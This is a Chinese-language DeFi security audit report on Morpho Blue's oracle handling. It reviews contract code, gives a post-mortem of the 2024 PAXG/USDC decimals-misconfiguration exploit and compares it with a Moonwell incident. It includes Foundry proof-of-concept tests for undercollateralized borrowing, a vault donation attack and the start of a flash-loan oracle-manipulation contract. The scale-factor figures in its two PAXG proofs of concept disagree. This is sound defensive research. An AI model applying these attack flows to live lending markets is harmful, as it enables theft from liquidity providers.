# Morpho Blue 无许可市场 Oracle 安全深度审计报告

**日期:** 2026-03-14
**审计对象:** Morpho Blue 核心合约 + MorphoChainlinkOracleV2 + MetaMorpho Vault
**核心合约地址:** `0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb` (Ethereum Mainnet)
**TVL:** ~$6.93B (2026-03-10)
**关联分析:** [Moonwell Oracle 配置错误 $1.78M](./07_real_hack_analysis_2026.md#4-moonwell--oracle-配置错误-178m)
**已确认历史漏洞:** PAXG/USDC Oracle 配置错误 $230K (2024-10-13)

---

## 目录

1. [执行摘要](#1-执行摘要)
2. [Morpho Blue 架构概述](#2-morpho-blue-架构概述)
3. [合约代码审计](#3-合约代码审计)
   - [3.1 createMarket() — 市场创建无 Oracle 验证](#31-createmarket--市场创建无-oracle-验证)
   - [3.2 IOracle 接口 — 极简但无防护](#32-ioracle-接口--极简但无防护)
   - [3.3 MorphoChainlinkOracleV2 — SCALE_FACTOR 计算](#33-morphochainlinkoraclev2--scale_factor-计算)
   - [3.4 liquidate() — Oracle 价格的使用](#34-liquidate--oracle-价格的使用)
   - [3.5 _isHealthy() — 健康度检查](#35-_ishealthy--健康度检查)
4. [已确认漏洞: PAXG/USDC $230K 攻击复盘](#4-已确认漏洞-paxgusdc-230k-攻击复盘)
5. [与 Moonwell Oracle 配置错误的对比分析](#5-与-moonwell-oracle-配置错误的对比分析)
6. [Morpho Blue 特有的 Oracle 攻击面分析](#6-morpho-blue-特有的-oracle-攻击面分析)
   - [6.1 攻击面 1: 市场创建阶段的 Oracle 配置错误](#61-攻击面-1-市场创建阶段的-oracle-配置错误)
   - [6.2 攻击面 2: MetaMorpho Vault 的 Oracle 边缘情况](#62-攻击面-2-metamorpho-vault-的-oracle-边缘情况)
   - [6.3 攻击面 3: 非 Chainlink Oracle 的风险](#63-攻击面-3-非-chainlink-oracle-的风险)
   - [6.4 攻击面 4: 闪电贷 + Oracle 操纵组合攻击](#64-攻击面-4-闪电贷--oracle-操纵组合攻击)
7. [攻击 PoC 模拟](#7-攻击-poc-模拟)
8. [防御建议](#8-防御建议)
9. [综合评估](#9-综合评估)

---

## 1. 执行摘要

### 核心发现

Morpho Blue 的核心合约设计是安全的——经过 OpenZeppelin、Spearbit、Cantina 等多家审计机构审计，代码质量极高（仅 ~650 行，极简设计）。**然而，其"Oracle 无关"的设计哲学将 Oracle 安全性完全外包给了市场创建者和 Vault 策展人，创造了一个系统性的"安全责任真空"。**

| 发现 | 严重性 | 状态 |
|------|:---:|:---:|
| `createMarket()` 对 Oracle 地址零验证 | **高** | 设计决策 (by design) |
| SCALE_FACTOR 小数位配置错误无防护 | **高** | 已发生攻击 ($230K) |
| MetaMorpho Vault 可被 faulty oracle 市场影响 | **高** | 已知风险，部分缓解 |
| Oracle 价格无合理性范围检查 | **中** | 设计决策 |
| 闪电贷 + 低流动性 Oracle 池组合攻击 | **中** | 取决于具体市场 |
| V2 Vault 多维度风险管控改进 | **正面** | 已部署 |

### 关键结论

**Morpho Blue 存在与 Moonwell 完全相同模式的 Oracle 配置错误漏洞，且已在 2024 年 10 月被实际利用。** 与 Moonwell 不同的是：
- Moonwell 的错误来自**治理提案**（影响整个协议）
- Morpho Blue 的错误来自**市场创建者**（影响单个市场）

隔离性限制了爆炸半径，但**无许可创建**意味着此类错误会**反复发生**。

---

## 2. Morpho Blue 架构概述

### 架构分层

```
┌─────────────────────────────────────────────────────┐
│                    用户 (Lender/Borrower)              │
├─────────────────────────────────────────────────────┤
│         MetaMorpho Vault (策展层)                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐           │
│  │ Curator  │  │Allocator │  │ Sentinel │  (V2 角色) │
│  │ 风险管理  │  │ 资金分配  │  │ 安全监控  │           │
│  └──────────┘  └──────────┘  └──────────┘           │
├─────────────────────────────────────────────────────┤
│              Morpho Blue (核心借贷层)                 │
│  ┌──────────────────────────────────────────────┐   │
│  │  Morpho.sol (~650 lines, immutable)          │   │
│  │  createMarket() | supply() | borrow()        │   │
│  │  liquidate()    | _isHealthy()               │   │
│  └──────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────┤
│                外部依赖 (无验证)                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐          │
│  │  Oracle  │  │   IRM    │  │  Token   │          │
│  │ (任意)   │  │(需治理)  │  │  (任意)  │          │
│  └──────────┘  └──────────┘  └──────────┘          │
└─────────────────────────────────────────────────────┘
```

### 安全责任分布

| 组件 | 安全负责方 | 验证机制 |
|------|-----------|---------|
| Morpho.sol 核心逻辑 | Morpho Labs | 审计 + 形式化验证 |
| IRM (利率模型) | **治理** (enableIrm) | 白名单机制 |
| LLTV (清算阈值) | **治理** (enableLltv) | 白名单机制 |
| **Oracle** | **市场创建者** (无验证) | **无** |
| **Token** | **市场创建者** (无验证) | **无** |
| 资金分配策略 | Vault Curator | Timelock + 角色分离 |

**关键不对称: IRM 和 LLTV 需要治理审批，但 Oracle 和 Token 完全无验证。**

---

## 3. 合约代码审计

### 3.1 createMarket() — 市场创建无 Oracle 验证

```solidity
// Morpho.sol — createMarket 函数
// 源码: https://github.com/morpho-org/morpho-blue/blob/main/src/Morpho.sol

struct MarketParams {
    address loanToken;        // ❌ 无验证
    address collateralToken;  // ❌ 无验证
    address oracle;           // ❌ 无验证 — 核心风险点
    address irm;              // ✅ 治理白名单
    uint256 lltv;             // ✅ 治理白名单
}

function createMarket(MarketParams memory marketParams) external {
    Id id = marketParams.id();

    require(isIrmEnabled[marketParams.irm], ErrorsLib.IRM_NOT_ENABLED);   // ✅
    require(isLltvEnabled[marketParams.lltv], ErrorsLib.LLTV_NOT_ENABLED); // ✅
    require(market[id].lastUpdate == 0, ErrorsLib.MARKET_ALREADY_CREATED); // ✅

    // ❌ 缺失的验证:
    // require(marketParams.oracle != address(0), "ZERO_ORACLE");
    // require(IOracle(marketParams.oracle).price() > 0, "INVALID_PRICE");
    // require(marketParams.loanToken != address(0), "ZERO_LOAN_TOKEN");
    // require(marketParams.collateralToken != address(0), "ZERO_COLLATERAL");

    market[id].lastUpdate = uint128(block.timestamp);
    idToMarketParams[id] = marketParams;

    emit EventsLib.CreateMarket(id, marketParams);

    if (marketParams.irm != address(0))
        IIrm(marketParams.irm).borrowRate(marketParams, market[id]);
}
```

**审计发现 F-01: Oracle 地址零验证**

| 属性 | 值 |
|------|-----|
| 严重性 | **高** |
| 类型 | 输入验证缺失 (OWASP SC05) |
| 位置 | `Morpho.sol::createMarket()` |
| 状态 | 设计决策 — Morpho Labs 认为这是"oracle-agnostic"设计的一部分 |

**问题:**
- 任何地址（包括 `address(0)`）都可以作为 Oracle 传入
- 不验证 Oracle 是否实现了 `IOracle` 接口
- 不验证 `price()` 返回值是否在合理范围内
- 不验证 Token 小数位与 Oracle SCALE_FACTOR 是否一致

**影响:**
- 恶意或配置错误的 Oracle 会导致抵押品估值完全错误
- 用户可能在不知情下存入配置错误的市场
- MetaMorpho Vault 的 Curator 可能错误地将此类市场加入 Vault

---

### 3.2 IOracle 接口 — 极简但无防护

```solidity
// IOracle.sol
// 源码: https://github.com/morpho-org/morpho-blue/blob/main/src/interfaces/IOracle.sol

/// @dev It is the user's responsibility to select markets with safe oracles.
interface IOracle {
    /// @notice Returns the price of 1 asset of collateral token
    /// quoted in 1 asset of loan token, scaled by 1e36.
    function price() external view returns (uint256);
}
```

**审计发现 F-02: Oracle 接口无安全约束**

| 属性 | 值 |
|------|-----|
| 严重性 | **中** |
| 类型 | 接口设计缺陷 |
| 位置 | `IOracle.sol` |

**问题:**
- 接口仅定义一个 `price()` 函数，无其他安全方法
- 没有 `decimals()` — 调用者无法验证精度是否正确
- 没有 `lastUpdated()` — 无法检测过期价格
- 没有 `description()` — 无法程序化验证 Oracle 对应的资产对
- 注释 "It is the user's responsibility" — 将安全责任完全推给用户

**对比 Chainlink AggregatorV3Interface:**
```solidity
interface AggregatorV3Interface {
    function decimals() external view returns (uint8);          // ✅ 有
    function description() external view returns (string);      // ✅ 有
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,     // ✅ 有 — 可检测过期
        uint80 answeredInRound
    );
}
```

---

### 3.3 MorphoChainlinkOracleV2 — SCALE_FACTOR 计算

```solidity
// MorphoChainlinkOracleV2.sol (简化)
// 源码: https://github.com/morpho-org/morpho-blue-oracles/blob/main/src/morpho-chainlink/MorphoChainlinkOracleV2.sol

constructor(
    IERC4626 baseVault,
    uint256 baseVaultConversionSample,
    AggregatorV3Interface baseFeed1,
    AggregatorV3Interface baseFeed2,
    uint256 baseTokenDecimals,            // ❌ 由部署者手动输入
    IERC4626 quoteVault,
    uint256 quoteVaultConversionSample,
    AggregatorV3Interface quoteFeed1,
    AggregatorV3Interface quoteFeed2,
    uint256 quoteTokenDecimals            // ❌ 由部署者手动输入
) {
    // SCALE_FACTOR 计算
    SCALE_FACTOR = 10 ** (
        36
        + quoteTokenDecimals
        + quoteFeed1.decimals()           // 从 feed 自动获取
        + quoteFeed2.decimals()           // 从 feed 自动获取
        - baseTokenDecimals               // ❌ 手动输入 — 可能错误
        - baseFeed1.decimals()            // 从 feed 自动获取
        - baseFeed2.decimals()            // 从 feed 自动获取
    ) * quoteVaultConversionSample
      / baseVaultConversionSample;
}

function price() external view returns (uint256) {
    return SCALE_FACTOR
        * baseVault.convertToAssets(baseVaultConversionSample)
        * baseFeed1.latestAnswer()
        * baseFeed2.latestAnswer()
        / quoteVault.convertToAssets(quoteVaultConversionSample)
        / quoteFeed1.latestAnswer()
        / quoteFeed2.latestAnswer();
}
```

**审计发现 F-03: SCALE_FACTOR 小数位配置错误无防护**

| 属性 | 值 |
|------|-----|
| 严重性 | **高** |
| 类型 | 输入验证缺失 — 已被利用 |
| 位置 | `MorphoChainlinkOracleV2::constructor()` |
| 已确认攻击 | PAXG/USDC $230K (2024-10-13) |

**根因分析:**

```
SCALE_FACTOR 计算中的 6 个变量:
┌────────────────────┬──────────────┬────────────────┐
│ 变量               │ 来源         │ 可信度          │
├────────────────────┼──────────────┼────────────────┤
│ quoteFeed1.decimals│ 链上自动获取 │ ✅ 可信        │
│ quoteFeed2.decimals│ 链上自动获取 │ ✅ 可信        │
│ baseFeed1.decimals │ 链上自动获取 │ ✅ 可信        │
│ baseFeed2.decimals │ 链上自动获取 │ ✅ 可信        │
│ baseTokenDecimals  │ 手动输入     │ ❌ 可能错误    │
│ quoteTokenDecimals │ 手动输入     │ ❌ 可能错误    │
└────────────────────┴──────────────┴────────────────┘
```

**关键问题:** `baseTokenDecimals` 和 `quoteTokenDecimals` 由部署者**手动输入**，而合约本可以通过调用 `ERC20(token).decimals()` 自动获取。这个设计缺陷直接导致了 PAXG/USDC 攻击。

**修复建议:**
```solidity
// ✅ 应自动获取 token decimals
constructor(
    // ... 其他参数 ...
    address baseToken,        // 传入 token 地址而非 decimals
    address quoteToken
) {
    // 自动获取，消除人为错误
    uint256 baseTokenDecimals = IERC20Metadata(baseToken).decimals();
    uint256 quoteTokenDecimals = IERC20Metadata(quoteToken).decimals();
    // ... SCALE_FACTOR 计算 ...
}
```

---

### 3.4 liquidate() — Oracle 价格的使用

```solidity
// Morpho.sol::liquidate() (简化)

function liquidate(
    MarketParams memory marketParams,
    address borrower,
    uint256 seizedAssets,
    uint256 repaidShares,
    bytes calldata data
) external returns (uint256, uint256) {
    Id id = marketParams.id();
    require(market[id].lastUpdate != 0, ErrorsLib.MARKET_NOT_CREATED);
    require(UtilsLib.exactlyOneZero(seizedAssets, repaidShares), ErrorsLib.INCONSISTENT_INPUT);

    _accrueInterest(marketParams, id);

    // ❌ 直接使用 Oracle 价格，无合理性检查
    uint256 collateralPrice = IOracle(marketParams.oracle).price();

    // 验证借款人仓位不健康
    require(!_isHealthy(marketParams, id, borrower, collateralPrice), ErrorsLib.HEALTHY_POSITION);

    // 计算清算激励因子
    // LIF = min(1.15, WAD / (WAD - 0.3 * (WAD - LLTV)))
    uint256 liquidationIncentiveFactor = ...;

    // 基于 Oracle 价格计算扣押/偿还金额
    if (seizedAssets > 0) {
        // seizedAssets 已知 → 计算 repaidAssets
        repaidAssets = seizedAssets.mulDivUp(collateralPrice, ORACLE_PRICE_SCALE)
            .wDivUp(liquidationIncentiveFactor);
    } else {
        // repaidShares 已知 → 计算 seizedAssets
        seizedAssets = repaidAssets.wMulDown(liquidationIncentiveFactor)
            .mulDivDown(ORACLE_PRICE_SCALE, collateralPrice);
    }

    // ... 执行清算 ...
}
```

**审计发现 F-04: 清算中无 Oracle 价格合理性检查**

| 属性 | 值 |
|------|-----|
| 严重性 | **中** |
| 类型 | 业务逻辑漏洞 (OWASP SC02) |
| 位置 | `Morpho.sol::liquidate()` |

**问题:**
- `collateralPrice` 直接从 Oracle 获取，无范围检查
- 如果 Oracle 返回异常价格（过高或过低），清算会以错误的汇率执行
- 没有与历史价格的偏差检查
- 没有价格断路器（circuit breaker）

**注意:** 这是**设计决策**而非代码漏洞——Morpho Blue 将价格验证责任交给 Oracle 实现本身。但在 Oracle 配置错误的情况下，这意味着**没有任何最后防线**。

---

### 3.5 _isHealthy() — 健康度检查

```solidity
// Morpho.sol::_isHealthy() (简化)

function _isHealthy(
    MarketParams memory marketParams,
    Id id,
    address borrower,
    uint256 collateralPrice  // 来自 Oracle，无验证
) internal view returns (bool) {
    uint256 borrowed = uint256(position[id][borrower].borrowShares)
        .toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares);

    uint256 maxBorrow = uint256(position[id][borrower].collateral)
        .mulDivDown(collateralPrice, ORACLE_PRICE_SCALE)  // ❌ 直接使用
        .wMulDown(marketParams.lltv);

    return maxBorrow >= borrowed;
}
```

**分析:** 健康度检查完全依赖 `collateralPrice`。如果 Oracle 价格被高估 10^12 倍（如 PAXG 案例），那么 `maxBorrow` 也会被高估 10^12 倍，使得攻击者可以用极少抵押品借出大量资产。

---

## 4. 已确认漏洞: PAXG/USDC $230K 攻击复盘

### 攻击基本信息

| 项目 | 值 |
|------|-----|
| 日期 | 2024-10-13 |
| 链 | Ethereum |
| 损失 | ~$230,000 |
| 攻击交易 | `0x256979ae169abb7fbbbbc14188742f4b9debf48b48ad5b5207cadcc99ccb493b` |
| 攻击者 | `0x02DBe46169fDf6555F2A125eEe3dce49703b13f5` |
| 攻击类型 | Oracle 配置错误 (SCALE_FACTOR 小数位不匹配) |

### 根因

```
PAXG (Paxos Gold): 18 decimals
USDC (USD Coin):    6 decimals
差值: 12 decimals

市场部署者错误地将两个 token 的 decimals 都设为 8
→ SCALE_FACTOR 偏差 = 10^12
→ PAXG 被定价为 ~$2,600,000,000,000 (2.6万亿) 而非 ~$2,600
```

### 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│  Step 1: 部署者创建 PAXG/USDC 市场                          │
│  → Oracle: MorphoChainlinkOracleV2                          │
│  → ❌ baseTokenDecimals = 8 (应为 18)                       │
│  → ❌ quoteTokenDecimals = 8 (应为 6)                       │
│  → SCALE_FACTOR 错误: 偏差 10^(18-8) - (6-8) = 10^12      │
├─────────────────────────────────────────────────────────────┤
│  Step 2: 某些用户向该市场提供 USDC 流动性                    │
│  → 这些用户未验证 Oracle 价格是否正确                        │
│  → UI 显示正确的市场价格（来自 CoinGecko），未显示 Oracle 价格│
├─────────────────────────────────────────────────────────────┤
│  Step 3: 攻击者存入 $350 PAXG 作为抵押品                    │
│  → Oracle 认为价值: $350 × 10^12 ≈ $2.6 万亿               │
│  → _isHealthy() 计算: maxBorrow = $2.6T × LLTV ≈ 巨额      │
├─────────────────────────────────────────────────────────────┤
│  Step 4: 攻击者借出 $230,000 USDC                           │
│  → _isHealthy() 检查通过（$2.6T >> $230K）                  │
│  → 实际抵押率: $350 / $230,000 = 0.15% (严重欠抵押)        │
├─────────────────────────────────────────────────────────────┤
│  Step 5: 攻击者提取 USDC，不还款                            │
│  → 虽然仓位可被清算，但清算者也会使用错误的 Oracle 价格      │
│  → 清算无法恢复损失                                         │
│  → 提供 USDC 的 LP 损失全部资金                             │
└─────────────────────────────────────────────────────────────┘
```

### 攻击模拟 (Solidity PoC)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// 模拟 Morpho Blue 的 Oracle 配置错误攻击

interface IOracle {
    function price() external view returns (uint256);
}

// 模拟错误配置的 Oracle — 与 PAXG/USDC 案例相同
contract MisconfiguredOracle is IOracle {
    // ❌ SCALE_FACTOR 计算错误: baseTokenDecimals=8 而非 18
    // 导致价格被高估 10^12 倍
    uint256 constant WRONG_SCALE_FACTOR = 1e48; // 应为 1e36
    uint256 constant PAXG_USD_PRICE = 2600e8;   // Chainlink: $2600, 8 decimals

    function price() external pure returns (uint256) {
        // 返回: PAXG 价格 × 错误的 SCALE_FACTOR
        // = 2600 × 10^(48-8) = 2.6 × 10^43
        // 正确值应为: 2600 × 10^(36-8) = 2.6 × 10^31
        return PAXG_USD_PRICE * WRONG_SCALE_FACTOR / 1e8;
    }
}

contract CorrectOracle is IOracle {
    uint256 constant CORRECT_SCALE_FACTOR = 1e24;
    // 36 + 6(USDC) - 18(PAXG) = 24
    uint256 constant PAXG_USD_PRICE = 2600e8;

    function price() external pure returns (uint256) {
        return PAXG_USD_PRICE * CORRECT_SCALE_FACTOR / 1e8;
    }
}

// 简化版 Morpho Blue 核心逻辑
contract SimplifiedMorpho {
    uint256 constant ORACLE_PRICE_SCALE = 1e36;

    mapping(address => uint256) public collateral;  // user => collateral amount
    mapping(address => uint256) public borrowed;     // user => borrowed amount
    uint256 public totalSupply;

    IOracle public oracle;
    uint256 public lltv; // e.g., 0.86e18 = 86%

    constructor(IOracle _oracle, uint256 _lltv) {
        oracle = _oracle;
        lltv = _lltv;
    }

    function supply(uint256 amount) external {
        totalSupply += amount;
    }

    function supplyCollateral(address user, uint256 amount) external {
        collateral[user] += amount;
    }

    function borrow(uint256 amount) external {
        uint256 collateralPrice = oracle.price();
        uint256 maxBorrow = collateral[msg.sender]
            * collateralPrice / ORACLE_PRICE_SCALE
            * lltv / 1e18;

        require(amount <= maxBorrow - borrowed[msg.sender], "UNHEALTHY");

        borrowed[msg.sender] += amount;
        totalSupply -= amount;
    }
}

contract MorphoOracleExploitTest is Test {
    MisconfiguredOracle wrongOracle;
    CorrectOracle rightOracle;
    SimplifiedMorpho morphoWrong;
    SimplifiedMorpho morphoRight;

    address attacker = address(0xDEAD);
    address lender = address(0xBEEF);

    function setUp() public {
        wrongOracle = new MisconfiguredOracle();
        rightOracle = new CorrectOracle();
        morphoWrong = new SimplifiedMorpho(wrongOracle, 0.86e18);
        morphoRight = new SimplifiedMorpho(rightOracle, 0.86e18);

        // LP 提供流动性
        morphoWrong.supply(500_000e6); // 50万 USDC
        morphoRight.supply(500_000e6);
    }

    function testExploit_WrongOracle() public {
        // 攻击者存入极少量 PAXG ($350 worth)
        uint256 paxgAmount = 0.134e18; // ~0.134 PAXG ≈ $350

        morphoWrong.supplyCollateral(attacker, paxgAmount);

        // 尝试借出 $230,000 USDC
        vm.prank(attacker);
        morphoWrong.borrow(230_000e6);
        // ✅ 成功! Oracle 认为 0.134 PAXG 价值 ~$2.6 万亿

        assertEq(morphoWrong.borrowed(attacker), 230_000e6);
        emit log_string("EXPLOIT SUCCESS: Borrowed $230K with $350 collateral");
    }

    function testBorrow_CorrectOracle() public {
        uint256 paxgAmount = 0.134e18;

        morphoRight.supplyCollateral(attacker, paxgAmount);

        // 同样尝试借出 $230,000 USDC
        vm.prank(attacker);
        vm.expectRevert("UNHEALTHY");
        morphoRight.borrow(230_000e6);
        // ✅ 正确拒绝! Oracle 正确计算 0.134 PAXG 仅值 $350
    }
}
```

---

## 5. 与 Moonwell Oracle 配置错误的对比分析

### 漏洞模式对比

| 维度 | Moonwell ($1.78M) | Morpho Blue ($230K) |
|------|-------------------|---------------------|
| **日期** | 2026-02-15 | 2024-10-13 |
| **Oracle 错误类型** | 遗漏 ETH/USD 乘数 | SCALE_FACTOR 小数位错误 |
| **价格偏差** | 99.95% 低估 (cbETH: $1.12 vs $2,240) | 10^12 倍高估 (PAXG: $2.6T vs $2,600) |
| **错误来源** | 治理提案 (MIP-X43) | 市场部署者手动输入 |
| **影响范围** | 整个 cbETH 市场 | 单个 PAXG/USDC 市场 |
| **攻击方式** | 不正确清算 | 欠抵押借款 |
| **修复时间** | 5 天 (治理投票) | 市场不可修改 (永久) |
| **防护机制** | 无价格断路器 | 无 Oracle 验证 |

### 共同根因

```
两个攻击共享完全相同的漏洞模式:

1. Oracle 价格公式/参数配置错误
   Moonwell: getPrice_cbETH() 遗漏 × ETH/USD
   Morpho:   SCALE_FACTOR 小数位不匹配

2. 缺少价格合理性检查
   两个协议都不检查:
   ❌ Oracle 价格是否在合理范围内 (MIN/MAX)
   ❌ 价格是否与上次价格偏差过大
   ❌ 价格是否与外部参考价格一致

3. 缺少自动化验证
   ❌ 部署前未自动验证 Oracle 价格与市场价格的一致性
   ❌ 没有 CI/CD 级别的 Oracle 配置测试

4. 人为操作 = 人为错误
   Moonwell: 治理提案审查不足
   Morpho:   部署者手动输入小数位
```

### 差异分析

```
Morpho Blue 的隔离市场设计限制了爆炸半径:
┌────────────────────────────────────────────────────┐
│ Moonwell:                                          │
│   一个 Oracle 错误 → 影响 cbETH 全部仓位           │
│   修复需要 5 天治理投票                             │
│   期间所有 cbETH 仓位持续被清算                     │
│   总损失: $1.78M                                   │
├────────────────────────────────────────────────────┤
│ Morpho Blue:                                       │
│   一个 Oracle 错误 → 只影响该特定市场               │
│   市场不可修改 → 永远无法修复                       │
│   但损失限于该市场的存款总额                        │
│   总损失: $230K                                    │
└────────────────────────────────────────────────────┘

但 Morpho Blue 的风险在于:
→ 无许可 = 任何人都可以创建配置错误的市场
→ 相同的错误可以反复发生 (不同的市场、不同的 token 对)
→ 市场不可修改 = 错误一旦发生无法回滚
```

---

## 6. Morpho Blue 特有的 Oracle 攻击面分析

### 6.1 攻击面 1: 市场创建阶段的 Oracle 配置错误

**风险等级: 高 (已被利用)**

```
攻击前提条件:
1. 部署者使用 MorphoChainlinkOracleV2 但输入了错误的 token decimals
2. 或: 部署者使用了完全自定义的 Oracle（可能有任意 bug）
3. LP 在未验证 Oracle 价格的情况下向该市场存入资金

可能出错的 SCALE_FACTOR 场景:

Token 对          正确 SCALE  错误 SCALE      价格偏差
──────────────────────────────────────────────────────
PAXG(18)/USDC(6)  1e24        1e48 (8/8)      10^12 倍高估 ✅ 已发生
WBTC(8)/USDC(6)   1e34        1e36 (18/18)    100 倍高估
WBTC(8)/DAI(18)   1e22        1e36 (18/18)    10^14 倍高估
stETH(18)/USDT(6) 1e24        1e36 (18/18)    10^12 倍高估
```

### 6.2 攻击面 2: MetaMorpho Vault 的 Oracle 边缘情况

**风险等级: 高**

```
MetaMorpho Vault V1 的特殊风险:

                   ┌─────────────────────────┐
                   │   MetaMorpho Vault      │
                   │   (管理 $XX M 资金)      │
                   ├─────────────────────────┤
                   │ WithdrawQueue:           │
                   │  Market A (✅ 正常)      │
                   │  Market B (✅ 正常)      │
                   │  Market C (❌ 错误Oracle)│ ← cap = 0 但仍在队列中
                   └─────────────────────────┘

问题: 即使 Market C 的 supply cap 设为 0:
1. Market C 仍在 WithdrawQueue 中
2. 如果 Market C 的 Oracle 价格 > 市场价格
   → 攻击者可通过"捐赠"增加 Vault 在 Market C 的份额
   → 导致 Vault 产生坏账
3. 这意味着 "cap = 0" 不等于 "零风险"

防御: Curator 必须将不使用的市场从 WithdrawQueue 完全移除
      不能仅仅依赖 cap = 0

V2 改进:
- 引入 Sentinel 角色，可快速响应
- 多维度 Cap 系统（按 Oracle 类型设置上限）
- 但仍需 Curator 正确配置
```

### 6.3 攻击面 3: 非 Chainlink Oracle 的风险

**风险等级: 中-高**

```
Morpho Blue 的 oracle-agnostic 设计允许使用任何 Oracle:

Oracle 类型          抗操纵性    配置复杂度    风险
──────────────────────────────────────────────────
Chainlink 价格源      高          中           低
Pyth Network          高          中           低
Uniswap V3 TWAP      中-高       高           中
Uniswap V3 瞬时价格   低          低           ❌ 极高
自定义 AMM 池价格     低          高           ❌ 极高
硬编码价格            N/A         低           ❌ 极高(不会更新)
address(0)           N/A         N/A          ❌ 致命

参考 07 报告 sDOLA/LlamaLend 案例:
→ 使用单一 AMM 池的瞬时价格作为 Oracle
→ 闪电贷操纵价格 → 触发 27 个仓位的清算
→ 损失 $240K

如果 Morpho Blue 市场使用类似的低流动性 AMM 池作为 Oracle:
→ 同样的攻击完全适用
→ 且 Morpho Blue 提供免费闪电贷，降低攻击成本
```

### 6.4 攻击面 4: 闪电贷 + Oracle 操纵组合攻击

**风险等级: 中**

```
Morpho Blue 的免费闪电贷 + 低质量 Oracle 市场 = 完美攻击组合

攻击流程:
┌──────────────────────────────────────────────────────────┐
│ 1. 识别 Morpho Blue 上使用 AMM 池价格作为 Oracle 的市场  │
│ 2. 确认该 AMM 池流动性不足（<$1M）                       │
│ 3. 利用 Morpho Blue 的免费闪电贷:                        │
│    a) 借入大量资金（免费，无手续费）                      │
│    b) 在 AMM 池中大额交易，操纵瞬时价格                  │
│    c) 被操纵的价格通过 Oracle 传递到 Morpho Blue 市场     │
│    d) 情况 A: 价格被低估 → 触发不正确清算               │
│       情况 B: 价格被高估 → 欠抵押借款                   │
│    e) 获利                                               │
│    f) 归还闪电贷                                         │
│ 4. 全部在一个交易内完成                                  │
└──────────────────────────────────────────────────────────┘

关键: Morpho Blue 的免费闪电贷意味着
      攻击者不需要任何初始资金
```

### 攻击面综合评估

```
攻击面               已确认  可利用性  影响范围     优先级
─────────────────────────────────────────────────────────
Oracle 配置错误       ✅是    高       单个市场     🔴 P0
Vault faulty oracle  已知    中       单个Vault   🔴 P0
非Chainlink Oracle   理论    中-高    单个市场     🟠 P1
闪电贷+Oracle操纵    理论    中       单个市场     🟠 P1
```

---

## 7. 攻击 PoC 模拟

### PoC 1: SCALE_FACTOR 配置错误（重现 PAXG 攻击）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @notice 重现 Morpho Blue PAXG/USDC Oracle 配置错误
/// @dev 演示 baseTokenDecimals 输入错误导致的资金损失

interface IERC20 {
    function decimals() external view returns (uint8);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract OracleWithWrongDecimals {
    // 模拟: 部署者将 PAXG(18 decimals) 错误输入为 8
    // 将 USDC(6 decimals) 错误输入为 8
    // 正确: 36 + 6 - 18 = 24 → SCALE = 1e24
    // 错误: 36 + 8 - 8 = 36 → SCALE = 1e36
    uint256 public constant WRONG_SCALE = 1e36;
    uint256 public constant CORRECT_SCALE = 1e24;

    // 假设 PAXG/USD = $2600, Chainlink 8 decimals
    uint256 public constant PAXG_PRICE = 2600e8;
    // 假设 USDC/USD = $1, Chainlink 8 decimals
    uint256 public constant USDC_PRICE = 1e8;

    function priceWrong() external pure returns (uint256) {
        // 错误: PAXG 被定价为 $2600 × 10^(36-8-8) = $2600 × 10^20
        return PAXG_PRICE * WRONG_SCALE / USDC_PRICE;
        // = 2600e8 * 1e36 / 1e8 = 2.6e39
    }

    function priceCorrect() external pure returns (uint256) {
        // 正确: PAXG 被定价为 $2600 × 10^(24-8-8) = $2600 × 10^8
        return PAXG_PRICE * CORRECT_SCALE / USDC_PRICE;
        // = 2600e8 * 1e24 / 1e8 = 2.6e27
    }

    function showPriceDifference() external pure returns (
        uint256 wrongPrice,
        uint256 correctPrice,
        uint256 inflationFactor
    ) {
        wrongPrice = PAXG_PRICE * WRONG_SCALE / USDC_PRICE;
        correctPrice = PAXG_PRICE * CORRECT_SCALE / USDC_PRICE;
        inflationFactor = wrongPrice / correctPrice;
        // inflationFactor = 10^12 — 价格被高估一万亿倍
    }
}
```

### PoC 2: MetaMorpho Vault — Faulty Oracle 市场捐赠攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice 模拟 MetaMorpho Vault V1 的 faulty oracle 边缘情况
/// @dev 即使 cap=0，仍可通过捐赠增加 vault 在该市场的份额

contract VaultFaultyOracleAttack {
    // 简化的 Vault 状态
    mapping(bytes32 => uint256) public vaultShares; // marketId => shares
    mapping(bytes32 => uint256) public supplyCap;   // marketId => cap
    bytes32[] public withdrawQueue;

    // 攻击场景:
    // 1. Vault 的 withdrawQueue 中包含一个 faulty oracle 的市场 (Market C)
    // 2. supplyCap[C] = 0 — curator 认为这是安全的
    // 3. Market C 的 oracle 报价高于市场价格

    function demonstrateAttack() external pure returns (string memory) {
        return
            "Attack flow:\n"
            "1. Vault has Market C in withdrawQueue with cap=0\n"
            "2. Market C oracle: reports price > market price\n"
            "3. Condition: market_price < oracle_price * LLTV\n"
            "4. Attacker donates to Market C on behalf of Vault\n"
            "5. Vault's shares in Market C increase\n"
            "6. When Vault withdraws from Market C, uses inflated oracle price\n"
            "7. Vault incurs bad debt\n\n"
            "Fix: Remove Market C from withdrawQueue entirely,\n"
            "     not just set cap=0";
    }
}
```

### PoC 3: 闪电贷 + AMM Oracle 操纵

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice 模拟利用 Morpho Blue 免费闪电贷 + AMM Oracle 操纵的攻击
/// @dev 参考 sDOLA/LlamaLend $240K 攻击模式

interface IMorpho {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
    function liquidate(bytes32 marketId, address borrower, uint256 seized, uint256 repaid, bytes calldata data) external;
}

interface IUniswapV3Pool {
    function swap(address recipient, bool zeroForOne, int256 amount, uint160 sqrtPriceLimitX96, bytes calldata data) external;
}

contract FlashLoanOracleManipulation {
    IMorpho public morpho;
    IUniswapV3Pool public targetPool; // Oracle 依赖的 AMM 池
